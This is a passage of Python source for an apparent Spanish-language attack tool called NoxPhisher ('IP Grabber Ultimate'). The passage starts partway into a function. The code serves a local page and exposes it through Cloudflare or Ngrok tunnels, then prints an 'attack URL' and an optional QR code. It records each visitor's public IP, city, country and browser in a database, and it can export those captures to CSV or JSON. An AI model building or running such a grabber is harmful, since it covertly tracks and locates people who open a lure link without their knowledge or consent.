        if opc == '':
            return True # Iniciar
        elif opc == '0':
            return False # Volver
        elif opc.isdigit():
            idx = int(opc) - 1
            if 0 <= idx < len(keys):
                k = keys[idx]
                if k != "ip_public":
                    GRABBER_OPTIONS[k] = not GRABBER_OPTIONS[k]

def view_captures(limit=50):
    grabber = IPGrabberUltimate()
    rows    = grabber.get_captures(limit)
    total, unique = grabber.get_stats()

    clear_screen()
    print_logo()
    print("=" * 70)
    print(f"{Fore.GREEN}CAPTURAS GUARDADAS{Style.RESET_ALL}")
    print("=" * 70)
    print(f"Total: {total} | IPs únicas: {unique}")
    print("-" * 70)
    if not rows:
        print(f"{Fore.YELLOW}No hay capturas registradas.{Style.RESET_ALL}")
    for row in rows:
        print(f"#{row['capture_id']} | {row['datetime']} | {Fore.CYAN}{row['ip_public']}{Style.RESET_ALL} | {row['city']}, {row['country']} | {row['browser']}")
    print("=" * 70)
    print(f"\n{Fore.CYAN}[C]{Style.RESET_ALL} Exportar CSV  {Fore.CYAN}[J]{Style.RESET_ALL} Exportar JSON  {Fore.CYAN}[ENTER]{Style.RESET_ALL} Volver")
    opc = input(f"\n{Fore.GREEN}NoxPhisher > {Style.RESET_ALL}").strip().lower()
    if opc == 'c' and rows:
        export_captures(rows, 'csv')
    elif opc == 'j' and rows:
        export_captures(rows, 'json')

def export_captures(rows, fmt='csv'):
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    try:
        if fmt == 'csv':
            import csv
            filename = f"capturas_{timestamp}.csv"
            fields = rows[0].keys()
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=fields)
                writer.writeheader()
                for row in rows:
                    writer.writerow(dict(row))
            print(f"\n{Fore.GREEN}[✔] Exportado a: {filename}{Style.RESET_ALL}")
        elif fmt == 'json':
            filename = f"capturas_{timestamp}.json"
            data = [dict(row) for row in rows]
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            print(f"\n{Fore.GREEN}[✔] Exportado a: {filename}{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error al exportar: {e}{Style.RESET_ALL}")
    input(f"{Fore.GREEN}Presiona ENTER para volver...{Style.RESET_ALL}")

def run_grabber():
    if not grabber_options_menu():
        return
        
    clear_screen()
    print_logo()
    
    spinner("Preparando servidor web local...", 1.5)
    
    grabber = IPGrabberUltimate(port=CONFIG['port'], dedup_window=CONFIG['dedup_window'])
    grabber.create_web()

    server = HTTPServer(('0.0.0.0', grabber.port), GrabberHandler)
    server.grabber = grabber

    t = threading.Thread(target=server.serve_forever)
    t.daemon = True
    t.start()

    public_ip = grabber.get_public_ip()
    
    url = None
    proc = None
    tunnel_type = ""
    
    if CONFIG['tunnel_choice'] == 1:
        spinner("Verificando Cloudflared...", 1)
        if not get_cloudflared_path():
            fake_progress("Instalando Cloudflared", steps=15, delay=0.2)
            ensure_cloudflared()
        spinner("Iniciando túnel Cloudflared...", 2)
        url, proc = start_cloudflare_tunnel(grabber.port)
        tunnel_type = "Cloudflare"
    elif CONFIG['tunnel_choice'] == 2:
        spinner("Verificando Ngrok...", 1)
        if not ensure_ngrok():
            print(f"{Fore.RED}[!] No se pudo instalar Ngrok. Continuando sin túnel...{Style.RESET_ALL}")
            time.sleep(2)
        else:
            spinner("Iniciando túnel Ngrok...", 2)
            url, proc = start_ngrok_tunnel(grabber.port)
            tunnel_type = "Ngrok"
    
    clear_screen()
    print_logo()
    print(f"{Fore.GREEN}[+] Servidor Local: {Style.RESET_ALL}http://localhost:{grabber.port}")
    print(f"{Fore.GREEN}[+] Redirección:    {Style.RESET_ALL}{CONFIG['redirect_url']}")
    
    if url:
        print(f"\n{Fore.CYAN}══════════════════════════════════════════════════════════════════════{Style.RESET_ALL}")
        print(f"{Fore.GREEN}URL DE ATAQUE ({tunnel_type}):{Style.RESET_ALL} {Fore.WHITE}{Style.BRIGHT}{url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}══════════════════════════════════════════════════════════════════════{Style.RESET_ALL}")
        if CONFIG['generate_qr']:
            generate_qr_terminal(url)
    else:
        url = f"http://{public_ip}:{grabber.port}"
        print(f"\n{Fore.RED}[!] Sin túnel activo.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}URL directa (requiere puertos abiertos): {url}{Style.RESET_ALL}\n")
        if CONFIG['generate_qr']:
            generate_qr_terminal(url)
            
    print(f"\n{Fore.YELLOW}[*] Esperando capturas... (Ctrl+C para salir){Style.RESET_ALL}\n")
    
    try:
        while True:
            grabber.cleanup_seen()
            time.sleep(60)
    except KeyboardInterrupt:
        shutdown(grabber, proc, server)

def shutdown(grabber, proc, server):
    total, unique = grabber.get_stats()
    elapsed = int(time.time() - grabber.start_time)
    hours   = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    
    print("\n\n" + Fore.CYAN + "═" * 50 + Style.RESET_ALL)
    print(f"{Fore.GREEN}RESUMEN DE SESIÓN{Style.RESET_ALL}")
    print(Fore.CYAN + "═" * 50 + Style.RESET_ALL)
    print(f"  Duración:         {hours}h {minutes}m")
    print(f"  Capturas en ses.: {grabber.total_captures}")
    print(f"  Total DB:         {total}")
    print(Fore.CYAN + "═" * 50 + Style.RESET_ALL)
    
    print(f"\n{Fore.YELLOW}[+] Cerrando servidor...{Style.RESET_ALL}")
    if proc:
        proc.terminate()
    server.shutdown()
    sys.exit(0)

def install_dependencies():
    clear_screen()
    print_logo()
    width = 56
    menu_header("Instalación de Dependencias", width=width)
    
    env = detect_environment()
    print_row(f"{Fore.BLUE}Sistema detectado: {env.upper()}{Style.RESET_ALL}", len(f"Sistema detectado: {env.upper()}"), width=width)
    print(f"│{Fore.CYAN}{'─' * (width - 2)}{Style.RESET_ALL}│")
    
    # 1. Cloudflared
    print_row(f"{Fore.YELLOW}[1/3] Verificando Cloudflared...{Style.RESET_ALL}", len("[1/3] Verificando Cloudflared..."), width=width)
    cf_path = get_cloudflared_path()
    if cf_path:
        print_row(f"  {Fore.GREEN}✔ Instalado{Style.RESET_ALL}", len("  ✔ Instalado"), width=width)
        cf_ok = True
    else:
        print_row(f"  {Fore.YELLOW}No encontrado. Instalando...{Style.RESET_ALL}", len("  No encontrado. Instalando..."), width=width)
        cf_ok = ensure_cloudflared()
        if cf_ok:
            print_row(f"  {Fore.GREEN}✔ Instalado correctamente.{Style.RESET_ALL}", len("  ✔ Instalado correctamente."), width=width)
        else:
            print_row(f"  {Fore.RED}❌ Error en la instalación.{Style.RESET_ALL}", len("  ❌ Error en la instalación."), width=width)
            
    print(f"│{Fore.CYAN}{'─' * (width - 2)}{Style.RESET_ALL}│")
    
    # 2. Ngrok
    print_row(f"{Fore.YELLOW}[2/3] Verificando Ngrok/Pyngrok...{Style.RESET_ALL}", len("[2/3] Verificando Ngrok/Pyngrok..."), width=width)
    ng_ok = ensure_ngrok()
    if ng_ok:
        print_row(f"  {Fore.GREEN}✔ ngrok/pyngrok listo.{Style.RESET_ALL}", len("  ✔ ngrok/pyngrok listo."), width=width)
    else:
        print_row(f"  {Fore.RED}❌ Error al configurar ngrok.{Style.RESET_ALL}", len("  ❌ Error al configurar ngrok."), width=width)
        
    print(f"│{Fore.CYAN}{'─' * (width - 2)}{Style.RESET_ALL}│")
    
    # 3. Paquetes Python
    print_row(f"{Fore.YELLOW}[3/3] Verificando paquetes Python...{Style.RESET_ALL}", len("[3/3] Verificando paquetes Python..."), width=width)
    pip_packages = {'requests': 'requests', 'colorama': 'colorama', 'qrcode': 'qrcode', 'pyngrok': 'pyngrok', 'PIL': 'pillow'}
    pip_ok = True
    for imp_name, pkg_name in pip_packages.items():
        try:
            __import__(imp_name)
            print_row(f"  {Fore.GREEN}✔ {pkg_name}{Style.RESET_ALL}", len(f"  ✔ {pkg_name}"), width=width)
        except ImportError:
            print_row(f"  {Fore.YELLOW}⬇ Instalando {pkg_name}...{Style.RESET_ALL}", len(f"  ⬇ Instalando {pkg_name}..."), width=width)
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", pkg_name], check=True, capture_output=True)
                print_row(f"  {Fore.GREEN}✔ {pkg_name} instalado{Style.RESET_ALL}", len(f"  ✔ {pkg_name} instalado"), width=width)
            except Exception:
                print_row(f"  {Fore.RED}❌ {pkg_name} falló{Style.RESET_ALL}", len(f"  ❌ {pkg_name} falló"), width=width)
                pip_ok = False
    
    print(f"│{Fore.CYAN}{'─' * (width - 2)}{Style.RESET_ALL}│")
    
    all_ok = cf_ok and ng_ok and pip_ok
    if all_ok:
        print_row(f"{Fore.GREEN}¡Todas las dependencias están listas!{Style.RESET_ALL}", len("¡Todas las dependencias están listas!"), width=width)
    else:
        print_row(f"{Fore.RED}Algunas dependencias fallaron.{Style.RESET_ALL}", len("Algunas dependencias fallaron."), width=width)
        
    print(f"{Fore.CYAN}└{'─' * (width - 2)}┘{Style.RESET_ALL}")
    input(f"\n{Fore.GREEN}Presiona ENTER para volver al menú principal...{Style.RESET_ALL}")

def system_diagnostics():
    clear_screen()
    print_logo()
    width = 56
    menu_header("Diagnóstico del Sistema", width=width)
    
    env = detect_environment()
    arch = platform.machine()
    py_ver = platform.python_version()
    
    # Sistema
    print_row(f"{Fore.CYAN}── Sistema ──{Style.RESET_ALL}", len("── Sistema ──"), width=width)
    print_row(f"  OS:           {Fore.WHITE}{env.upper()}{Style.RESET_ALL}", len(f"  OS:           {env.upper()}"), width=width)
    print_row(f"  Arquitectura: {Fore.WHITE}{arch}{Style.RESET_ALL}", len(f"  Arquitectura: {arch}"), width=width)
    print_row(f"  Python:       {Fore.WHITE}{py_ver}{Style.RESET_ALL}", len(f"  Python:       {py_ver}"), width=width)
    
    print(f"│{Fore.CYAN}{'─' * (width - 2)}{Style.RESET_ALL}│")
    
    # Túneles
    print_row(f"{Fore.CYAN}── Túneles ──{Style.RESET_ALL}", len("── Túneles ──"), width=width)
    cf_path = get_cloudflared_path()
    if cf_path:
        print_row(f"  Cloudflared:  {Fore.GREEN}✔ Instalado{Style.RESET_ALL}", len("  Cloudflared:  ✔ Instalado"), width=width)
    else:
        print_row(f"  Cloudflared:  {Fore.RED}✘ No instalado{Style.RESET_ALL}", len("  Cloudflared:  ✘ No instalado"), width=width)
    
    try:
        from pyngrok import ngrok
        ngrok.install_ngrok()
        print_row(f"  Ngrok:        {Fore.GREEN}✔ Instalado{Style.RESET_ALL}", len("  Ngrok:        ✔ Instalado"), width=width)
    except Exception:
        print_row(f"  Ngrok:        {Fore.RED}✘ No instalado{Style.RESET_ALL}", len("  Ngrok:        ✘ No instalado"), width=width)
    
    tk_status = f"{Fore.GREEN}✔ Configurado{Style.RESET_ALL}" if CONFIG['ngrok_token'] else f"{Fore.RED}✘ Sin configurar{Style.RESET_ALL}"
    tk_vis = "✔ Configurado" if CONFIG['ngrok_token'] else "✘ Sin configurar"
    print_row(f"  Ngrok Token:  {tk_status}", len(f"  Ngrok Token:  {tk_vis}"), width=width)
    
    print(f"│{Fore.CYAN}{'─' * (width - 2)}{Style.RESET_ALL}│")
    
    # Paquetes Python
    print_row(f"{Fore.CYAN}── Paquetes Python ──{Style.RESET_ALL}", len("── Paquetes Python ──"), width=width)
    pkgs = {'requests': 'requests', 'colorama': 'colorama', 'qrcode': 'qrcode',
            'pyngrok': 'pyngrok', 'plyer': 'plyer', 'PIL': 'pillow'}
    for imp_name, pkg_name in pkgs.items():
        try:
            __import__(imp_name)
            print_row(f"  {pkg_name.ljust(12)}  {Fore.GREEN}✔{Style.RESET_ALL}", len(f"  {pkg_name.ljust(12)}  ✔"), width=width)
        except ImportError:
            print_row(f"  {pkg_name.ljust(12)}  {Fore.RED}✘{Style.RESET_ALL}", len(f"  {pkg_name.ljust(12)}  ✘"), width=width)
    
    print(f"│{Fore.CYAN}{'─' * (width - 2)}{Style.RESET_ALL}│")
    
    # Red
    print_row(f"{Fore.CYAN}── Red ──{Style.RESET_ALL}", len("── Red ──"), width=width)
    try:
        r = requests.get('https://api.ipify.org', timeout=5)
        pub_ip = r.text.strip()
        print_row(f"  Internet:     {Fore.GREEN}✔ Conectado{Style.RESET_ALL}", len("  Internet:     ✔ Conectado"), width=width)
        print_row(f"  IP pública:   {Fore.WHITE}{pub_ip}{Style.RESET_ALL}", len(f"  IP pública:   {pub_ip}"), width=width)
    except Exception:
        print_row(f"  Internet:     {Fore.RED}✘ Sin conexión{Style.RESET_ALL}", len("  Internet:     ✘ Sin conexión"), width=width)
    
    # Base de Datos
    print(f"│{Fore.CYAN}{'─' * (width - 2)}{Style.RESET_ALL}│")
    print_row(f"{Fore.CYAN}── Base de Datos ──{Style.RESET_ALL}", len("── Base de Datos ──"), width=width)
    grabber = IPGrabberUltimate()
    total, unique = grabber.get_stats()
    print_row(f"  Capturas:     {Fore.WHITE}{total}{Style.RESET_ALL}", len(f"  Capturas:     {total}"), width=width)
    print_row(f"  IPs únicas:   {Fore.WHITE}{unique}{Style.RESET_ALL}", len(f"  IPs únicas:   {unique}"), width=width)
    db_size = os.path.getsize("captures.db") if os.path.exists("captures.db") else 0
    db_kb = db_size / 1024
    print_row(f"  Tamaño DB:    {Fore.WHITE}{db_kb:.1f} KB{Style.RESET_ALL}", len(f"  Tamaño DB:    {db_kb:.1f} KB"), width=width)
    
    print(f"{Fore.CYAN}└{'─' * (width - 2)}┘{Style.RESET_ALL}")
    input(f"\n{Fore.GREEN}Presiona ENTER para volver...{Style.RESET_ALL}")

def main_menu():
    while True:
        clear_screen()
        print_logo()
        print(f"{Fore.CYAN}╔══════════════════════════════════════════╗{Style.RESET_ALL}")
        tunnel_str = ['CF', 'Ngrok', 'Local'][CONFIG['tunnel_choice']-1]
        print(f"║  {Fore.WHITE}[01]{Style.RESET_ALL} " + "Iniciar IP Grabber Ultimate".ljust(35) + f"{Fore.CYAN}║{Style.RESET_ALL}")
        print(f"║  {Fore.WHITE}[02]{Style.RESET_ALL} " + "Instalar Dependencias".ljust(35) + f"{Fore.CYAN}║{Style.RESET_ALL}")
        print(f"║  {Fore.WHITE}[03]{Style.RESET_ALL} " + f"Seleccionar Túnel ({tunnel_str})".ljust(35) + f"{Fore.CYAN}║{Style.RESET_ALL}")
        print(f"║  {Fore.WHITE}[04]{Style.RESET_ALL} " + "Ver Capturas Guardadas".ljust(35) + f"{Fore.CYAN}║{Style.RESET_ALL}")
        print(f"║  {Fore.WHITE}[05]{Style.RESET_ALL} " + "Configuración".ljust(35) + f"{Fore.CYAN}║{Style.RESET_ALL}")
        print(f"║  {Fore.WHITE}[06]{Style.RESET_ALL} " + "Diagnóstico del Sistema".ljust(35) + f"{Fore.CYAN}║{Style.RESET_ALL}")
        print(f"║  {Fore.WHITE}[00]{Style.RESET_ALL} " + "Salir".ljust(35) + f"{Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════╝{Style.RESET_ALL}")
        
        opc = input(f"\n{Fore.GREEN}NoxPhisher > {Style.RESET_ALL}").strip()
        
        if opc in ['1', '01']:
            run_grabber()
        elif opc in ['2', '02']:
            install_dependencies()
        elif opc in ['3', '03']:
            tunnel_menu()
        elif opc in ['4', '04']:
            view_captures()
        elif opc in ['5', '05']:
            config_menu()
        elif opc in ['6', '06']:
            system_diagnostics()
        elif opc in ['0', '00']:
            clear_screen()
            print(f"{Fore.GREEN}¡Gracias por usar NoxPhisher!{Style.RESET_ALL}")
            sys.exit(0)
        else:
            print(f"\n{Fore.RED}[!] Opción no válida.{Style.RESET_ALL}")
            time.sleep(1)

def main():
    parser = argparse.ArgumentParser(description="NoxPhisher — Ultimate Edition")
    parser.add_argument('--cli',    action='store_true',    help='Ejecutar directo sin menú interactivo')
    parser.add_argument('--qr',     action='store_true',    help='Generar QR (modo CLI)')
    parser.add_argument('--window', type=int, default=60,   help='Deduplicación (modo CLI)')
    parser.add_argument('--port',   type=int, default=8080, help='Puerto (modo CLI)')
    parser.add_argument('--view',   type=int, nargs='?', const=50, help='Ver N capturas y salir')
    args = parser.parse_args()

    if args.view is not None:
        view_captures(args.view)
        return

    if args.cli:
        # Modo antiguo, directo
        CONFIG['port'] = args.port
        CONFIG['dedup_window'] = args.window
        CONFIG['generate_qr'] = args.qr
        run_grabber()
    else:
        # Modo Menú Interactivo
        clear_screen()
        print_logo()
        spinner("Inicializando módulos...", 1.5)
        spinner("Verificando dependencias...", 1)
        time.sleep(0.5)
        main_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.GREEN}¡Gracias por usar NoxPhisher!{Style.RESET_ALL}")
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
